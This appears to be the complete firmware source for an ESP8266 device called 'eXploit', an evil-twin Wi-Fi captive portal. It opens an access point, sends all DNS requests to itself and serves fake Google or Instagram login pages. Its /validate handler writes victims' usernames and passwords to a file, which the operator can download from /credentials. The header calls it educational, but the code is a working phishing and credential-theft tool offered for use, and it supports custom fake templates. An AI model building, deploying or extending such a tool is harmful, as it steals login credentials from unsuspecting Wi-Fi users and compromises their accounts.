/*
                         eXploit V1.0

  eXploit is designed to perform various social engineering attacks.
  This tool should only be used for educational purposes/testing.

  Default configuration page  : 18.18.18.100

         WiFi
  Default SSID : eXploit
  Default PASS : vulnerable

      Config Portal
  Default Username : exploit
  Default Password : admin

  Custom templates can be loaded via ESP8266 Sketch Upload.
  Rename your template as index.html
  Put the index.html on {sketchlocation}/data/index.html
  or
  Upload the custom index.html using eXploit Config page.

  Custom Template Info : (Modify custom template form attributes accordingly)
  
  <form name="signIn" method="get" action="/validate" >
  <input id="Email" type="email" name="user" placeholder="Email" >   
  <input id="Password" type="password" name="pass" placeholder="Password" >             
  <input id="signIn" name="sign-in" type="submit" value="Log-In">
  
  OnBoard Templates : Google,Instagram

  Ethical use only :)
  agnath18@gmail.com

*/

#include <Arduino.h>
#include <ArduinoJson.h>
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include "FS.h"
#include "WebHTML.h"
#include "Config.h"

DNSServer dnsServer;
ESP8266WebServer webServer(80);

File fsUploadFile;

void loadCustom() {
  if (SPIFFS.exists("/index.html")) {
    File file = SPIFFS.open("/index.html", "r");
    size_t sent = webServer.streamFile(file, "text/html");

    file.close();
    Serial.println("Loaded Index file");
  }
  else {
    Serial.println("Index file not found");
  }
}

void fileUpload() {

  HTTPUpload& upload = webServer.upload();

  if (upload.status == UPLOAD_FILE_START) {

    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    Serial.print("fileUpload Name: "); Serial.println(filename);
    fsUploadFile = SPIFFS.open(filename, "w");
    filename = String();

  }
  else if (upload.status == UPLOAD_FILE_WRITE) {

    if (fsUploadFile)
      fsUploadFile.write(upload.buf, upload.currentSize);
  }
  else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      Serial.print("fileUpload Size: "); Serial.println(upload.totalSize);
      webServer.send(200, "text/html", eXploit_Config);
      webServer.send(303);
    }
    else {
      webServer.send(500, "text/plain", "500: couldn't create file");
    }
  }
}

void loadConfig(Config &config) {

  File file = SPIFFS.open("/config.json", "r");
  StaticJsonDocument<512> doc;

  DeserializationError error = deserializeJson(doc, file);
  if (error)
    Serial.println(F("Failed to read file, using default configuration"));

  strlcpy(config.ssid,
          doc["ssid"] | defaultSsid ,
          sizeof(config.ssid));

  strlcpy(config.pass,
          doc["pass"] | defaultPass ,
          sizeof(config.pass));

  strlcpy(config.p_user,
          doc["p_user"] | defaultUsername ,
          sizeof(config.p_user));

  strlcpy(config.p_pass,
          doc["p_pass"] | defaultPassword ,
          sizeof(config.p_pass));

  config.cstTmp = doc["cstTmp"] | customTemplate;

  config.authPt = doc["authPt"] | authPortal;

  config.selTem = doc["selTem"] | currentTemplate;

  file.close();
}

void saveConfig(const Config &config) {

  SPIFFS.remove("/config.json");
  File file = SPIFFS.open("/config.json", "w");

  if (!file) {
    Serial.println(F("Failed to create file"));
    return;
  }
  StaticJsonDocument<512> doc;
  doc["ssid"] = config.ssid;
  doc["pass"] = config.pass;
  doc["p_user"] = config.p_user;
  doc["p_pass"] = config.p_pass;
  doc["cstTmp"] = config.cstTmp;
  doc["authPt"] = config.authPt;
  doc["selTem"] = config.selTem;

  if (serializeJson(doc, file) == 0) {
    Serial.println(F("Failed to write to file"));
  }

  file.close();
}

void exploitCaptive() {
  if (config.cstTmp == 1) {
    loadCustom();
  }
  else {
    if (config.selTem == 0) {
      webServer.send(200, "text/html", eXploit_Captive);
    }
    else {
      webServer.send(200, "text/html", captiveInsta);
    }
  }
}

void exploitRestart() {
  webServer.send(200, "text/html", eXploit_Restart);
}

void exploitConfig() {
  if (config.authPt == 1) {
    if (!webServer.authenticate(config.p_user, config.p_pass))
      return webServer.requestAuthentication();
    webServer.send(200, "text/html", eXploit_Config);
  }
  else {
    webServer.send(200, "text/html", eXploit_Config);
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println("");
  Serial.println("Mount SPIFFS");
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS mount failed");
    return;
  }

  Serial.println(F("Loading configuration..."));
  loadConfig(config);
  Serial.print("Configuring access point...");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config.ssid, config.pass);
  dnsServer.start(DNS_PORT, "*", apIP);

  pinMode(16, OUTPUT);
  pinMode(2, OUTPUT);
  digitalWrite(16, HIGH);
  digitalWrite(2, LOW);

  webServer.onNotFound([]()
  {
    exploitCaptive();
  });

  webServer.begin();

  webServer.on("/config", exploitConfig);

  webServer.on("/", exploitCaptive);

  webServer.on("/saveConfig", []()
  {

    if (webServer.hasArg("disAuth")) {
      if (webServer.arg("disAuth") == "enabled") {
        config.authPt = 0;
      }
    }

    if (webServer.hasArg("enaCst")) {
      if (webServer.arg("enaCst") == "enabled") {
        config.cstTmp = 1;
      }
    }


    if (webServer.hasArg("selTem")) {
      if (webServer.arg("selTem") == "enabled") {
        config.selTem = 1;
      }
    }

    if (webServer.hasArg("selTem2")) {
      if (webServer.arg("selTem2") == "enabled") {
        config.selTem = 0;
      }
    }

    SPIFFS.remove("/config.json");
    File file = SPIFFS.open("/config.json", "w");

    if (!file) {
      Serial.println(F("Failed to create file"));
      return;
    }

    StaticJsonDocument<512> doc;

    doc["ssid"] = webServer.arg("ssid");
    doc["pass"] = webServer.arg("pass");
    doc["p_user"] = webServer.arg("p_user");
    doc["p_pass"] = webServer.arg("p_pass");
    doc["authPt"] = config.authPt;
    doc["cstTmp"] = config.cstTmp;
    doc["selTem"] = config.selTem;

    if (serializeJson(doc, file) == 0) {
      Serial.println(F("Failed to write to file"));
    }
    file.close();
    Serial.println("Save config finished");

    webServer.send(200, "text/html", eXploit_Config);
  });

  webServer.on("/validate", []() {
    File file = SPIFFS.open("/credentials.txt", "a");
    if (!file) {
      Serial.println("Failed to write credentials");
    }
    if (file.print("\nUsername : " + webServer.arg("user"))) {
      Serial.println("Username Written");
      digitalWrite(16, LOW);
      digitalWrite(2, HIGH);
    }
    else {
      Serial.println("\nUsername write failed");
    }
    if (file.print("\nPassword : " + webServer.arg("pass"))) {
      Serial.println("Password Written");
    }
    else {
      Serial.println("Password write failed");
    }
    delay(2000);
    file.close();
    webServer.send(200, "text/html", eXploit_Captive);
  });

  webServer.on("/credentials", []() {
    File download = SPIFFS.open("/credentials.txt", "r");
    if (!download) {
      Serial.println("Failed to read credentials file");
      webServer.send(200, "text/html", eXploit_Config);
    }
    if (download)
    {
      webServer.sendHeader("Content-Type", "text/text");
      webServer.sendHeader("Content-Disposition", "attachment; filename=credentials.txt");
      webServer.sendHeader("Connection", "close");
      webServer.streamFile(download, "application/octet-stream");
      download.close();
    }
  });

  webServer.on("/clear_cred", []() {

    File data = SPIFFS.open("/credentials.txt", "r");
    if (!data) {
      Serial.println("Failed to read credentials file");
      webServer.send(200, "text/html", eXploit_Config);
    }
    if (data)
    {
      if (SPIFFS.remove("/credentials.txt")) {
        Serial.println(F("File deleted successfully"));
      }
    }
    webServer.send(200, "text/html", eXploit_Config);
  });

  webServer.on("/reboot", []() {
    Serial.println("Esp going to reboot");
    exploitRestart();
    delay(1000);
    ESP.restart();
  });

  webServer.on("/upload", HTTP_POST, []() {
    webServer.send(200);
  },
  fileUpload);

  struct FSInfo {
    size_t totalBytes;
    size_t usedBytes;
    size_t blockSize;
    size_t pageSize;
    size_t maxOpenFiles;
    size_t maxPathLength;
  };

  FSInfo fsys;
}


void loop() {
  webServer.handleClient();
  dnsServer.processNextRequest();
}
